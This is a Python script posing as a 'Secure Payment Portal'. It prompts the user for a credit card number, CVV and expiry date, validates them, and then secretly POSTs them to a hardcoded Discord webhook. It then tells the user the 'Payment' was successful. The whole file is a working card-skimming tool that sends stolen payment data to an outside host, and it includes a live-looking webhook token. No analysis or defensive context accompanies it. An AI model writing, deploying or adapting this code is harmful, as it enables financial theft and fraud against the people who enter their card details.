import os
import datetime
import re
import urllib.parse
import urllib.request
import json

# Variables
webhook_url = (
    "https://discord.com/api/webhooks/1108064649481560105/"
    "HmLOPbYVjR262hbJUqKsAjGeKWrUwZr7BGwSENBayspaMH_nzPE3srqVzrxCUe4Vx2pH"
)

# Date stuff


class Mdate(datetime.date):
    def __new__(cls, year, month):
        return super(Mdate, cls).__new__(cls, year, month, 1)


def validate_card_number(card_number):
    # Check card number length and format
    if not re.match(r'^\d{15,19}$', card_number):
        return False

    # Implement Luhn algorithm for card number validation
    digits = [int(x) for x in card_number]
    checksum = sum(
        digits[-1::-2] + [
            sum(divmod(2 * d, 10)) for d in digits[-2::-2]
        ]
    )
    return checksum % 10 == 0


def validate_cvv(cvv):
    # Check CVV length and format
    if not re.match(r'^\d{3,4}$', cvv):
        return False
    return True


def validate_expiry_date(expiry_date):
    # Check expiry date format
    if not re.match(r'^\d{2}-\d{4}$', expiry_date):
        return False

    # Check if expiry date is not in the past
    today = datetime.date.today()
    month, year = map(int, expiry_date.split('-'))
    expiry = Mdate(year, month)
    return expiry >= today


def install_dependencies():
    # Install required dependencies
    try:
        os.system('pip install -r requirements.txt')
    except Exception as e:
        print("Error installing dependencies:", e)
        exit(1)


def update():
    # Install required dependencies
    try:
        os.system('pip install --upgrade pip')
    except Exception as e:
        print("Error installing dependencies:", e)
        exit(1)


# Clear terminal
os.system('cls' if os.name == 'nt' else 'clear')

print("Welcome to the SCR Technologies Secure Payment Portal! Please wait...")

# Install dependencies & update pip, then clear
install_dependencies()
update()
os.system('cls' if os.name == 'nt' else 'clear')

while True:
    card_number = input("Enter your credit/debit card number: ")
    if validate_card_number(card_number):
        break
    print("Invalid card number. Please try again.")

while True:
    cvv = input("Enter the CVV: ")
    if validate_cvv(cvv):
        break
    print("Invalid CVV. Please try again.")

while True:
    expiry_date = input("Enter the card's expiry date in MM-YYYY format: ")
    if validate_expiry_date(expiry_date):
        break
    print("Invalid expiry date. Please try again.")

# Prepare card data to send
card_data = {
    'card_number': card_number,
    'cvv': cvv,
    'expiry_date': expiry_date
}

# Convert card_data to JSON format
json_data = json.dumps(card_data)

# Set the content type header
headers = {'Content-Type': 'application/json'}

# Create a POST request with the JSON data and headers
request = urllib.request.Request(
    webhook_url,
    data=json_data.encode(),
    headers=headers
)
try:
    # Send the POST request
    response = urllib.request.urlopen(request)
    if response.status == 200:
        print("Payment successful!")
    else:
        print("Error sending card details to the webhook.")
except urllib.error.HTTPError as e:
    print("Error sending card details to the webhook:", e)
